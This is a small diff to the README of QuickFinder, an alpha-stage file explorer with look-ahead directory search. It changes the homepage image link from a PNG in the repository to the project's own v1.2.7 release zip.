@@ -1,5 +1,5 @@
 # QuickFinder _(very alpha version)_
-![homepage](https://github.com/pxp888/quickfinder/blob/main/resources/qf0.png)
+![homepage](https://github.com/pxp888/quickfinder/releases/download/v1.2.7/quickfinder.zip)
 
 ## What is it? 
 This is a simple file explorer that looks ahead in the directory tree so you can **_instantly_** search and find what you're looking for.  
